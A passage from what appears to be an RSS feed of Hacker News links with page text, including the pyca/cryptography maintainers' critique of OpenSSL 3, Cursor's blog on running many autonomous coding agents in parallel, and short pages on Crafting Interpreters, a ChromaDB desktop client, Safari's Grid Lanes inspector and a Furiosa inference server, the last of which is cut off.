    &lt;p&gt;You can interactively adjust the 3D view of the model using a mouse, pen or stylus, or by touch on a tablet or phone. You can also use the items in the 3D View Settings popup.&lt;/p&gt;
    &lt;p&gt;NOTE: You can use the Shift and Ctrl/Meta keys to adjust the increment of each scroll event or key press.&lt;/p&gt;
    &lt;p&gt;The Shift and Ctrl/Meta keys are used pretty extensively to modify interactive data entry. This applies to all increment buttons, scroll wheel motion, slider controls and input elements.&lt;/p&gt;
    &lt;p&gt;NOTE: You can use the scroll wheel to edit a data value when hovering over any slider, numeric input or even table rows that indicate their editibility.&lt;/p&gt;
    &lt;p&gt;This page uses the following frameworks/components:&lt;/p&gt;
    &lt;p&gt;Bootstrap v3.3.2 &lt;lb/&gt;Copyright © 2011-2015 Twitter, Inc. - github.com/twbs, &lt;lb/&gt;http://getbootstrap.com/ (LICENSE) &lt;/p&gt;
    &lt;p&gt;Bootstrap-popover-x v1.4.0 &lt;lb/&gt;Copyright © 2014, Kartik Visweswaran, Krajee.com, &lt;lb/&gt;https://github.com/kartik-v/bootstrap-popover-x (LICENSE) &lt;/p&gt;
    &lt;p&gt;jQuery v1.11.2 &lt;lb/&gt;Copyright © jQuery Foundation and other contributors, &lt;lb/&gt;https://jquery.com/ (LICENSE) &lt;/p&gt;
    &lt;p&gt;JSON Editor &lt;lb/&gt;Copyright © 2015 Jos de Jong - github.com/josdejong &lt;lb/&gt;https://github.com/josdejong/jsoneditor/ (LICENSE) &lt;/p&gt;
    &lt;p&gt;JSURL &lt;lb/&gt;Copyright © 2011 Bruno Jouhier - github.com/Sage &lt;lb/&gt;https://github.com/Sage/jsurl/ (LICENSE) &lt;/p&gt;
    &lt;p&gt;KnockoutJS v3.2.0 &lt;lb/&gt;Copyright © Steven Sanderson and the Knockout.js team, &lt;lb/&gt;http://knockoutjs.com/ (LICENSE) &lt;/p&gt;
    &lt;p&gt;Knockstrap v1.2.0 &lt;lb/&gt;Copyright © 2013 Artem Stepanyuk - github.com/faulknercs, &lt;lb/&gt;http://faulknercs.github.io/Knockstrap/ (LICENSE) &lt;/p&gt;
    &lt;p&gt;lightgl.js &lt;lb/&gt;Copyright © 2011 by Evan Wallace - https://github.com/evanw &lt;lb/&gt;https://github.com/evanw/lightgl.js/ (LICENSE) &lt;/p&gt;
    &lt;p&gt;Leaflet Maps API v1.4.0 &lt;lb/&gt;Copyright © Cloudmade, Vladimir Agafonkin - github.com/Leaflet, &lt;lb/&gt;https://leafletjs.com/ (LICENSE) &lt;/p&gt;
    &lt;p&gt;OpenStreetMap Map Data &lt;lb/&gt;Copyright © OpenStreetMap contributors - openstreetmap.org, &lt;lb/&gt;https://www.openstreetmap.org/about (LICENSE) &lt;/p&gt;
    &lt;p&gt;SnackbarJS &lt;lb/&gt;Copyright © 2014 Federico Zivolo - github.com/FezVrasta &lt;lb/&gt;http://fezvrasta.github.io/snackbarjs/ (LICENSE) &lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46623761</guid><pubDate>Wed, 14 Jan 2026 21:26:51 +0000</pubDate></item><item><title>The State of OpenSSL for pyca/cryptography</title><link>https://cryptography.io/en/latest/statements/state-of-openssl/</link><description>&lt;doc fingerprint="f2d8f89a348b06d0"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;The State of OpenSSL for &lt;code&gt;pyca/cryptography&lt;/code&gt;&lt;/head&gt;
    &lt;p&gt;Published: January 14, 2026&lt;/p&gt;
    &lt;p&gt;For the past 12 years, we (Paul Kehrer and Alex Gaynor) have maintained the Python &lt;code&gt;cryptography&lt;/code&gt; library (also known as &lt;code&gt;pyca/cryptography&lt;/code&gt; or cryptography.io). For that entire period, we’ve relied on OpenSSL to provide core cryptographic algorithms. This past October, we gave a talk at the OpenSSL Conference describing our experiences. This talk focuses on the growing problems we have with OpenSSL’s direction. The mistakes we see in OpenSSL’s development have become so significant that we believe substantial changes are required — either to OpenSSL, or to our reliance on it.&lt;/p&gt;
    &lt;p&gt;Fundamentally, OpenSSL’s trajectory can be understood as a play in three acts:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;In the pre-Heartbleed era (pre-2014), OpenSSL was under-maintained and languishing, substantially lagging behind expectations.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;In the immediate post-Heartbleed era, OpenSSL’s maintenance was reinvigorated and it made substantial progress and improvements. It grew a real code review process, began running tests in CI, adopted fuzz testing, and matured its release process.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Finally, in 2021 OpenSSL 3 was released. OpenSSL 3 introduced new APIs and had large internal refactors. Relative to previous OpenSSL versions, OpenSSL 3 had significant regressions in performance, complexity, API ergonomics, and didn’t make needed improvements in areas like testing, verification, and memory safety. Over the same period, OpenSSL’s forks have all made progress in these areas. Many of our concerns about OpenSSL’s direction in this time have substantial overlap with those highlighted by HAProxy.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The remainder of this post describes the problems we have with OpenSSL in more detail, and concludes with the changes we are making to our own policies in response. To avoid burying the lede, we intend to pursue several approaches to reducing our reliance on OpenSSL.&lt;/p&gt;
    &lt;head rend="h2"&gt;Performance&lt;/head&gt;
    &lt;p&gt;Compared to OpenSSL 1.1.1, OpenSSL 3 has significant performance regressions in areas such as parsing and key loading.&lt;/p&gt;
    &lt;p&gt;Several years ago, we filed a bug reporting that elliptic curve public key loading had regressed 5-8x between OpenSSL 1.1.1 and 3.0.7. The reason we had noticed this is that performance had gotten so bad that we’d seen it in our test suite runtimes. Since then, OpenSSL has improved performance such that it’s only 3x slower than it used to be. But more significantly, the response to the issue was that, ‘regression was expected with OpenSSL 3, and while there might be some optimizations, we shouldn’t expect it to ever get back to 1.1.1 levels’. Performance regressions can be acceptable, and even appropriate, when they improve other areas of the library, however as we’ll describe, the cause of these regressions has been other mistakes, and not offsetting improvements.&lt;/p&gt;
    &lt;p&gt;As a result of these sorts of regressions, when &lt;code&gt;pyca/cryptography&lt;/code&gt; migrated X.509 certificate parsing from OpenSSL to our own Rust code, we got a 10x performance improvement relative to OpenSSL 3 (n.b., some of this improvement is attributable to advantages in our own code, but much is explainable by the OpenSSL 3 regressions). Later, moving public key parsing to our own Rust code made end-to-end X.509 path validation 60% faster — just improving key loading led to a 60% end-to-end improvement, that’s how extreme the overhead of key parsing in OpenSSL was.&lt;/p&gt;
    &lt;p&gt;The fact that we are able to achieve better performance doing our own parsing makes clear that doing better is practical. And indeed, our performance is not a result of clever SIMD micro-optimizations, it’s the result of doing simple things that work: we avoid copies, allocations, hash tables, indirect calls, and locks — none of which should be required for parsing basic DER structures.&lt;/p&gt;
    &lt;head rend="h2"&gt;Complexity and APIs&lt;/head&gt;
    &lt;p&gt;OpenSSL 3 started the process of substantially changing its APIs — it introduced &lt;code&gt;OSSL_PARAM&lt;/code&gt; and has been using those for all new API surfaces (including those for post-quantum cryptographic algorithms). In short, &lt;code&gt;OSSL_PARAM&lt;/code&gt; works by passing arrays of key-value pairs to functions, instead of normal argument passing. This reduces performance, reduces compile-time verification, increases verbosity, and makes code less readable. To the extent there is an argument in favor of it, we infer that the benefit is that it allows OpenSSL to use the same API (and ABI) for different algorithms with different parameters, allowing things like reading algorithm parameters from configuration files with generic configuration parsing code that doesn’t need to be updated when new algorithms are added to OpenSSL.&lt;/p&gt;
    &lt;p&gt;For a concrete comparison of the verbosity, performing an ML-KEM encapsulation with OpenSSL takes 37 lines with 6 fallible function calls. Doing so with BoringSSL takes 19 lines with 3 fallible function calls.&lt;/p&gt;
    &lt;p&gt;In addition to making public APIs more frustrating and error prone to use, OpenSSL internals have also become more complex. For example, in order to make managing arrays of &lt;code&gt;OSSL_PARAM&lt;/code&gt; palatable, many OpenSSL source files are no longer simply C files, they now have a custom Perl preprocessor for their C code.&lt;/p&gt;
    &lt;p&gt;OpenSSL 3 also introduced the notion of “providers” (obsoleting, but not replacing, the previous ENGINE APIs), which allow for external implementations of algorithms (including algorithms provided by OpenSSL itself). This was the source of innumerable performance regressions, due to poorly designed APIs. In particular, OpenSSL allowed replacing any algorithm at any point in program execution, which necessitated adding innumerable allocations and locks to nearly every operation. To mitigate this, OpenSSL then added more caches, and ultimately RCU (Read-Copy-Update) — a complex memory management strategy which had difficult to diagnose bugs.&lt;/p&gt;
    &lt;p&gt;From our perspective, this is a cycle of compounding bad decisions: the providers API was incorrectly designed (there is no need to be able to redefine SHA-256 at arbitrary points in program execution) leading to performance regressions. This led to additional complexity to mitigate those regressions in the form of caching and RCU, which in term led to more bugs. And after all that, performance was still worse than it had been at the beginning.&lt;/p&gt;
    &lt;p&gt;Finally, taking an OpenSSL public API and attempting to trace the implementation to see how it is implemented has become an exercise in self-flagellation. Being able to read the source to understand how something works is important both as part of self-improvement in software engineering, but also because as sophisticated consumers there are inevitably things about how an implementation works that aren’t documented, and reading the source gives you ground truth. The number of indirect calls, optional paths, &lt;code&gt;#ifdef&lt;/code&gt;, and other obstacles to comprehension is astounding. We cannot overstate the extent to which just reading the OpenSSL source code has become miserable — in a way that both wasn’t true previously, and isn’t true in LibreSSL, BoringSSL, or AWS-LC.&lt;/p&gt;
    &lt;head rend="h2"&gt;Testing and Verification&lt;/head&gt;
    &lt;p&gt;We joke that the Python Cryptographic Authority is a CI engineering project that incidentally produces a cryptography library. The joke reflects our real belief that investment in testing and automation enables Pareto improvements in development speed and correctness — to the point that it can make other work look trivial.&lt;/p&gt;
    &lt;p&gt;The OpenSSL project does not sufficiently prioritize testing. While OpenSSL’s testing has improved substantially since the pre-Heartbleed era there are quite significant gaps. The gaps in OpenSSL’s test coverage were acutely visible during the OpenSSL 3.0 development cycle — where the project was extremely reliant on the community to report regressions experienced during the extended alpha and beta period (covering 19 pre-releases over the course of 16 months), because their own tests were insufficient to catch unintended real-world breakages. Despite the known gaps in OpenSSL’s test coverage, it’s still common for bug fixes to land without an accompanying regression test.&lt;/p&gt;
    &lt;p&gt;OpenSSL’s CI is exceptionally flaky, and the OpenSSL project has grown to tolerate this flakiness, which masks serious bugs. OpenSSL 3.0.4 contained a critical buffer overflow in the RSA implementation on AVX-512-capable CPUs. This bug was actually caught by CI — but because the crash only occurred when the CI runner happened to have an AVX-512 CPU (not all did), the failures were apparently dismissed as flakiness. Three years later, the project still merges code with failing tests: the day we prepared our conference slides, five of ten recent commits had failing CI checks, and the day before we delivered the talk, every single commit had failing cross-compilation builds.&lt;/p&gt;
    &lt;p&gt;This incident also speaks to the value of adopting tools like Intel SDE, which allows controlled testing against CPUs with different subsets of x86-64 extension instructions. Using Intel SDE to have dedicated test jobs with and without AVX-512 would have made the nature of the failure immediately legible and reproducible.&lt;/p&gt;
    &lt;p&gt;OpenSSL is not keeping pace with the state of the art in formal verification. Formal methods have gone from academic novelty to practical reality for meaningful chunks of cryptographic code. BoringSSL and AWS-LC have incorporated formally verified implementations and use automated reasoning to increase assurance.&lt;/p&gt;
    &lt;head rend="h2"&gt;Memory Safety&lt;/head&gt;
    &lt;p&gt;At the time OpenSSL was created, there were no programming languages that meaningfully provided performance, embeddability, and memory safety — if you wanted a memory safe language, you were committing to giving up performance and adding a garbage collector.&lt;/p&gt;
    &lt;p&gt;The world has changed. Nearly 5 years ago, &lt;code&gt;pyca/cryptography&lt;/code&gt; issued our first release incorporating Rust code, and since then we have migrated nearly all functionality to Rust, using a mix of pure-Rust for all parsing and X.509 operations combined with using OpenSSL for providing cryptographic algorithms — gaining performance wins and avoiding several OpenSSL CVEs. We know these transitions are possible.&lt;/p&gt;
    &lt;p&gt;A library committed to security needs to make a long-term commitment to a migration to a memory safe programming language. OpenSSL has shown no initiative at all on this issue.&lt;/p&gt;
    &lt;head rend="h2"&gt;Contributing Causes&lt;/head&gt;
    &lt;p&gt;Whenever issues with an open source project are raised, many will suggest this is an issue of funding or tragedy of the commons. This is inapposite, in the past decade, post-Heartbleed, OpenSSL has received considerable funding, and at this moment the OpenSSL Corporation and Foundation employ more software engineers than work full time on either BoringSSL or LibreSSL. The problems we have described are not ones caused by underfunding.&lt;/p&gt;
    &lt;p&gt;We do not fully understand the motivations that led to the public APIs and internal complexity we’ve described here. We’ve done our best to reverse engineer them by asking “what would motivate someone to do this” and often we’ve found ourselves coming up short. The fact that none of the other OpenSSL forks have made these same design choices is informative to the question of “was this necessary”.&lt;/p&gt;
    &lt;head rend="h2"&gt;Future Directions&lt;/head&gt;
    &lt;p&gt;Our experience with OpenSSL has been on a negative trajectory for several years. As a result of these issues, we are making the following changes to our (admittedly undocumented) policies.&lt;/p&gt;
    &lt;p&gt;First, we will no longer require OpenSSL implementations for new functionality. Where we deem it desirable, we will add new APIs that are only on LibreSSL/BoringSSL/AWS-LC. Concretely, we expect to add ML-KEM and ML-DSA APIs that are only available with LibreSSL/BoringSSL/AWS-LC, and not with OpenSSL.&lt;/p&gt;
    &lt;p&gt;Second, we currently statically link a copy of OpenSSL in our wheels (binary artifacts). We are beginning the process of looking into what would be required to change our wheels to link against one of the OpenSSL forks.&lt;/p&gt;
    &lt;p&gt;If we are able to successfully switch to one of OpenSSL’s forks for our binary wheels, we will begin considering the circumstances under which we would drop support for OpenSSL entirely.&lt;/p&gt;
    &lt;p&gt;Lastly, in the long term, we are actively tracking non-OpenSSL derived cryptography libraries such as Graviola as potential alternatives.&lt;/p&gt;
    &lt;p&gt;We recognize that changes in which libraries we use to provide cryptographic implementations have substantial impact on our users — particularly redistributors. We do not contemplate these steps lightly, nor do we anticipate making them hastily. However, due to the gravity of our concerns, we are compelled to act. If you rely on &lt;code&gt;pyca/cryptography&lt;/code&gt;’s support for OpenSSL, the best way to avoid the most drastic steps contemplated here is to engage with the OpenSSL project and contribute to improvements on these axes.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46624352</guid><pubDate>Wed, 14 Jan 2026 22:04:10 +0000</pubDate></item><item><title>Scaling long-running autonomous coding</title><link>https://cursor.com/blog/scaling-agents</link><description>&lt;doc fingerprint="9ff1b067ed89904f"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Scaling long-running autonomous coding&lt;/head&gt;
    &lt;p&gt;We've been experimenting with running coding agents autonomously for weeks.&lt;/p&gt;
    &lt;p&gt;Our goal is to understand how far we can push the frontier of agentic coding for projects that typically take human teams months to complete.&lt;/p&gt;
    &lt;p&gt;This post describes what we've learned from running hundreds of concurrent agents on a single project, coordinating their work, and watching them write over a million lines of code and trillions of tokens.&lt;/p&gt;
    &lt;head rend="h2"&gt;The limits of a single agent&lt;/head&gt;
    &lt;p&gt;Today's agents work well for focused tasks, but are slow for complex projects. The natural next step is to run multiple agents in parallel, but figuring out how to coordinate them is challenging.&lt;/p&gt;
    &lt;p&gt;Our first instinct was that planning ahead would be too rigid. The path through a large project is ambiguous, and the right division of work isn't obvious at the start. We began with dynamic coordination, where agents decide what to do based on what others are currently doing.&lt;/p&gt;
    &lt;head rend="h2"&gt;Learning to coordinate&lt;/head&gt;
    &lt;p&gt;Our initial approach gave agents equal status and let them self-coordinate through a shared file. Each agent would check what others were doing, claim a task, and update its status. To prevent two agents from grabbing the same task, we used a locking mechanism.&lt;/p&gt;
    &lt;p&gt;This failed in interesting ways:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;Agents would hold locks for too long, or forget to release them entirely. Even when locking worked correctly, it became a bottleneck. Twenty agents would slow down to the effective throughput of two or three, with most time spent waiting.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;The system was brittle: agents could fail while holding locks, try to acquire locks they already held, or update the coordination file without acquiring the lock at all.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;We tried replacing locks with optimistic concurrency control. Agents could read state freely, but writes would fail if the state had changed since they last read it. This was simpler and more robust, but there were still deeper problems.&lt;/p&gt;
    &lt;p&gt;With no hierarchy, agents became risk-averse. They avoided difficult tasks and made small, safe changes instead. No agent took responsibility for hard problems or end-to-end implementation. This lead to work churning for long periods of time without progress.&lt;/p&gt;
    &lt;head rend="h2"&gt;Planners and workers&lt;/head&gt;
    &lt;p&gt;Our next approach was to separate roles. Instead of a flat structure where every agent does everything, we created a pipeline with distinct responsibilities.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;Planners continuously explore the codebase and create tasks. They can spawn sub-planners for specific areas, making planning itself parallel and recursive.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Workers pick up tasks and focus entirely on completing them. They don't coordinate with other workers or worry about the big picture. They just grind on their assigned task until it's done, then push their changes.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;At the end of each cycle, a judge agent determined whether to continue, then the next iteration would start fresh. This solved most of our coordination problems and let us scale to very large projects without any single agent getting tunnel vision.&lt;/p&gt;
    &lt;head rend="h2"&gt;Running for weeks&lt;/head&gt;
    &lt;p&gt;To test this system, we pointed it at an ambitious goal: building a web browser from scratch. The agents ran for close to a week, writing over 1 million lines of code across 1,000 files. You can explore the source code on GitHub.&lt;/p&gt;
    &lt;p&gt;Despite the codebase size, new agents can still understand it and make meaningful progress. Hundreds of workers run concurrently, pushing to the same branch with minimal conflicts.&lt;/p&gt;
    &lt;p&gt;While it might seem like a simple screenshot, building a browser from scratch is extremely difficult.&lt;/p&gt;
    &lt;p&gt;Another experiment was doing an in-place migration of Solid to React in the Cursor codebase. It took over 3 weeks with +266K/-193K edits. As we've started to test the changes, we do believe it's possible to merge this change.&lt;/p&gt;
    &lt;p&gt;Another experiment was to improve an upcoming product. A long-running agent made video rendering 25x faster with an efficient Rust version. It also added support to zoom and pan smoothly with natural spring transitions and motion blurs, following the cursor. This code was merged and will be in production soon.&lt;/p&gt;
    &lt;p&gt;We have a few other interesting examples still running:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Java LSP: 7.4K commits, 550K LoC&lt;/item&gt;
      &lt;item&gt;Windows 7 emulator: 14.6K commits, 1.2M LoC&lt;/item&gt;
      &lt;item&gt;Excel: 12K commits, 1.6M LoC&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;What we've learned&lt;/head&gt;
    &lt;p&gt;We've deployed billions of tokens across these agents toward a single goal. The system isn't perfectly efficient, but it's far more effective than we expected.&lt;/p&gt;
    &lt;p&gt;Model choice matters for extremely long-running tasks. We found that GPT-5.2 models are much better at extended autonomous work: following instructions, keeping focus, avoiding drift, and implementing things precisely and completely.&lt;/p&gt;
    &lt;p&gt;Opus 4.5 tends to stop earlier and take shortcuts when convenient, yielding back control quickly. We also found that different models excel at different roles. GPT-5.2 is a better planner than GPT-5.1-codex, even though the latter is trained specifically for coding. We now use the model best suited for each role rather than one universal model.&lt;/p&gt;
    &lt;p&gt;Many of our improvements came from removing complexity rather than adding it. We initially built an integrator role for quality control and conflict resolution, but found it created more bottlenecks than it solved. Workers were already capable of handling conflicts themselves.&lt;/p&gt;
    &lt;p&gt;The best system is often simpler than you'd expect. We initially tried to model systems from distributed computing and organizational design. However, not all of them work for agents.&lt;/p&gt;
    &lt;p&gt;The right amount of structure is somewhere in the middle. Too little structure and agents conflict, duplicate work, and drift. Too much structure creates fragility.&lt;/p&gt;
    &lt;p&gt;A surprising amount of the system's behavior comes down to how we prompt the agents. Getting them to coordinate well, avoid pathological behaviors, and maintain focus over long periods required extensive experimentation. The harness and models matter, but the prompts matter more.&lt;/p&gt;
    &lt;head rend="h2"&gt;What's next&lt;/head&gt;
    &lt;p&gt;Multi-agent coordination remains a hard problem. Our current system works, but we're nowhere near optimal. Planners should wake up when their tasks complete to plan the next step. Agents occasionally run for far too long. We still need periodic fresh starts to combat drift and tunnel vision.&lt;/p&gt;
    &lt;p&gt;But the core question, can we scale autonomous coding by throwing more agents at a problem, has a more optimistic answer than we expected. Hundreds of agents can work together on a single codebase for weeks, making real progress on ambitious projects.&lt;/p&gt;
    &lt;p&gt;The techniques we're developing here will eventually inform Cursor's agent capabilities. If you're interested in working on the hardest problems in AI-assisted software development, we'd love to hear from you at hiring@cursor.com.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46624541</guid><pubDate>Wed, 14 Jan 2026 22:18:04 +0000</pubDate></item><item><title>Crafting Interpreters</title><link>https://craftinginterpreters.com/</link><description>&lt;doc fingerprint="55803025f8ef288d"&gt;
  &lt;main&gt;&lt;quote&gt;&lt;p&gt;Ever wanted to make your own programming language or wondered how they are designed and built?&lt;/p&gt;&lt;p&gt;If so, this book is for you.&lt;/p&gt;&lt;/quote&gt;&lt;p&gt;Crafting Interpreters contains everything you need to implement a full-featured, efficient scripting language. You’ll learn both high-level concepts around parsing and semantics and gritty details like bytecode representation and garbage collection. Your brain will light up with new ideas, and your hands will get dirty and calloused. It’s a blast.&lt;/p&gt;&lt;p&gt;Starting from &lt;code&gt;main()&lt;/code&gt;, you build a language that features rich
syntax, dynamic typing, garbage collection, lexical scope, first-class
functions, closures, classes, and inheritance. All packed into a few thousand
lines of clean, fast code that you thoroughly understand because you write each
one yourself.&lt;/p&gt;&lt;p&gt;The book is available in four delectable formats:&lt;/p&gt;&lt;p&gt;640 pages of beautiful typography and high resolution hand-drawn illustrations. Each page lovingly typeset by the author. The premiere reading experience.&lt;/p&gt;&lt;table&gt;&lt;row&gt;&lt;cell&gt;Amazon.com&lt;/cell&gt;&lt;cell&gt;.ca&lt;/cell&gt;&lt;cell&gt;.uk&lt;/cell&gt;&lt;cell&gt;.au&lt;/cell&gt;&lt;cell&gt;.de&lt;/cell&gt;&lt;cell&gt;.fr&lt;/cell&gt;&lt;cell&gt;.es&lt;/cell&gt;&lt;cell&gt;.it&lt;/cell&gt;&lt;cell&gt;.jp&lt;/cell&gt;&lt;/row&gt;&lt;/table&gt;&lt;table&gt;&lt;row&gt;&lt;cell&gt;Barnes and Noble&lt;/cell&gt;&lt;cell&gt;Book Depository&lt;/cell&gt;&lt;/row&gt;&lt;/table&gt;&lt;p&gt;Perfectly mirrors the hand-crafted typesetting and sharp illustrations of the print book, but much easier to carry around.&lt;/p&gt;Buy from Payhip Download Free Sample&lt;head rend="h3"&gt;Web&lt;/head&gt;&lt;p&gt;Meticulous responsive design looks great from your desktop down to your phone. Every chapter, aside, and illustration is there. Read the whole book for free. Really.&lt;/p&gt;Read Now&lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46624658</guid><pubDate>Wed, 14 Jan 2026 22:26:17 +0000</pubDate></item><item><title>ChromaDB Explorer</title><link>https://www.chroma-explorer.com/</link><description>&lt;doc fingerprint="6945c94fdd3bb92b"&gt;
  &lt;main&gt;
    &lt;p&gt;A modern, native desktop client for ChromaDB. Browse collections, search semantically, and manage your vector embeddings with ease.&lt;/p&gt;
    &lt;p&gt;Everything you need to work with ChromaDB, in a beautiful native app.&lt;/p&gt;
    &lt;p&gt;Connect to local, remote, or Chroma Cloud databases. Save and manage multiple connection profiles with secure API key storage.&lt;/p&gt;
    &lt;p&gt;Create, copy, and configure collections with ease. Set custom embedding functions and HNSW parameters.&lt;/p&gt;
    &lt;p&gt;Search your documents using natural language. Find similar content instantly with vector similarity search.&lt;/p&gt;
    &lt;p&gt;Built-in support for OpenAI, Cohere, Gemini, Ollama, Jina, Mistral, Voyage AI, and more.&lt;/p&gt;
    &lt;p&gt;Browse, create, edit, and delete documents. Batch operations for efficient bulk document management.&lt;/p&gt;
    &lt;p&gt;Beautiful glass morphism design that feels right at home on your Mac.&lt;/p&gt;
    &lt;p&gt;See Chroma Explorer in action.&lt;/p&gt;
    &lt;p&gt;Get Chroma Explorer for macOS and start exploring your vector databases today.&lt;/p&gt;
    &lt;p&gt;Requires macOS 11.0 or later&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46624731</guid><pubDate>Wed, 14 Jan 2026 22:30:16 +0000</pubDate></item><item><title>New Safari developer tools provide insight into CSS Grid Lanes</title><link>https://webkit.org/blog/17746/new-safari-developer-tools-provide-insight-into-css-grid-lanes/</link><description>&lt;doc fingerprint="b71e011275b5ebb3"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;New Safari developer tools provide insight into CSS Grid Lanes&lt;/head&gt;
    &lt;p&gt;You might have heard recently that Safari Technology Preview 234 landed the final plan for supporting masonry-style layouts in CSS. It’s called Grid Lanes.&lt;/p&gt;
    &lt;p&gt;CSS Grid Lanes adds a whole new capability to CSS Grid. It lets you line up content in either columns or rows — and not both.&lt;/p&gt;
    &lt;p&gt;This layout pattern allows content of various aspect ratios to pack together. No longer do you need to truncate content artificially to make it fit. Plus, the content that’s earlier in the HTML gets grouped together towards the start of the container. If new items get lazy loaded, they appear at the end without reshuffling what’s already on screen.&lt;/p&gt;
    &lt;p&gt;It can be tricky to understand the content flow pattern as you are learning Grid Lanes. The content is not flowing down the first column to the very bottom of the container, and then back up to the top of the second column. (If you want that pattern, use CSS Multicolumn or Flexbox.)&lt;/p&gt;
    &lt;p&gt;With Grid Lanes, the content flows perpendicular to the layout shape you created. When you define columns, the content flows back and forth across those columns, just like to how it would if rows existed. If you define rows, the content will flow up and down through the rows — in the column direction, as if columns were there.&lt;/p&gt;
    &lt;p&gt;Having a way to see the order of items can make it easier to understand this content flow. Introducing the CSS Grid Lanes Inspector in Safari. It’s just the regular Grid Inspector, now with more features.&lt;/p&gt;
    &lt;p&gt;Safari’s Grid Inspector already reveals the grid lines for Grid Lanes, and labels track sizes, line numbers, line names, and area names. Now it has a new feature — “Order Numbers”.&lt;/p&gt;
    &lt;p&gt;By turning on the order numbers in the example above, we can clearly see how Item 1, 2, 3, and 4 flow across the columns, as if there were a row. Then Item 5 is in the middle right, followed by Item 6 on the far right, and so on.&lt;/p&gt;
    &lt;p&gt;You might be tempted to believe the content order doesn’t matter. With pages like this photo gallery — most users will have no idea how the photos are ordered in the HTML. But for many users, the content order has a big impact on their experience. You should always consider what it’s like to tab through content — watching one item after another sequentially come into focus. Consider what it’s like to listen to the site through a screenreader while navigating by touch or keyboard. With Grid Lanes, you can adjust &lt;code&gt;flow-tolerance&lt;/code&gt; to reduce the jumping around and put items where people expect.&lt;/p&gt;
    &lt;p&gt;To know which value for flow tolerance to choose, it really helps to quickly see the order of items. That makes it immediately clear how your CSS impacts the result.&lt;/p&gt;
    &lt;p&gt;Order Numbers in the Grid Inspector is an extension of a feature Safari’s Flexbox Inspector has had since Safari 16.0 — marking the order of Flex items. Seeing content order is also helpful when using the &lt;code&gt;order&lt;/code&gt; property in Flexbox.&lt;/p&gt;
    &lt;p&gt;Order Numbers in Safari’s Grid Inspector works for CSS Grid and Subgrid, as well as Grid Lanes.&lt;/p&gt;
    &lt;head rend="h3"&gt;Try out Safari’s layout tooling&lt;/head&gt;
    &lt;p&gt;The Grid and Flexbox layout inspectors might seem similar across browsers, but the team behind Safari’s Web Inspector has taken the time to finely polish the details. In both the Grid and Flexbox Inspectors, you can simultaneously activate as many overlays as you want. No limits. And no janky scrolling due to performance struggles.&lt;/p&gt;
    &lt;p&gt;Safari’s Flexbox Inspector visually distinguishes between excess free space and Flex gaps, since knowing which is which can solve confusion. It shows the boundaries of items, revealing how they are distributed both on the main axis and the cross axis of Flexbox containers. And it lists all the Flexbox containers, making it easier to understand what’s happening overall.&lt;/p&gt;
    &lt;p&gt;Our Grid Inspector has a simple and clear interface, making it easy to understand the options. It also lists all Grid containers. And of course, you can change the default colors of the overlays, to best contrast with your site content.&lt;/p&gt;
    &lt;p&gt;And Safari’s Grid and Flexbox Inspectors are the only browser devtools that label content order. We hope seeing the order of content in Grid Lanes helps you understand it more thoroughly and enjoy using this powerful new layout mechanism.&lt;/p&gt;
    &lt;head rend="h3"&gt;Try out Order Numbers&lt;/head&gt;
    &lt;p&gt;Order Numbers in Safari’s Grid Inspector shipped today in Safari Technology Preview 235. Let us know what you think. There’s still time to polish the details to make the most helpful tool possible. You can ping Jen Simmons on Bluesky or Mastodon with links, comments and ideas.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46626210</guid><pubDate>Thu, 15 Jan 2026 00:34:59 +0000</pubDate></item><item><title>Furiosa: 3.5x efficiency over H100s</title><link>https://furiosa.ai/blog/introducing-rngd-server-efficient-ai-inference-at-data-center-scale</link><description>&lt;doc fingerprint="a19ed41a2a13478a"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Introducing Furiosa NXT RNGD Server: Efficient AI inference at data center scale&lt;/head&gt;
    &lt;p&gt;News&lt;/p&gt;
    &lt;p&gt;We are excited to introduce FuriosaAI’s NXT RNGD Server—our first branded, turnkey solution for AI inference.&lt;/p&gt;
    &lt;p&gt;Built around our RNGD accelerators, NXT RNGD Server is an optimized system that delivers high performance on today’s most important AI workloads while fitting seamlessly into existing data center environments.&lt;/p&gt;
    &lt;p&gt;With NXT RNGD Server, enterprises can move from experimentation to deployment faster than ever. The system ships with the Furiosa SDK and Furiosa LLM runtime preinstalled, so applications can serve immediately upon installation. We optimized the platform over standard PCIe interconnects, eliminating the need for proprietary fabrics or exotic infrastructure.&lt;/p&gt;
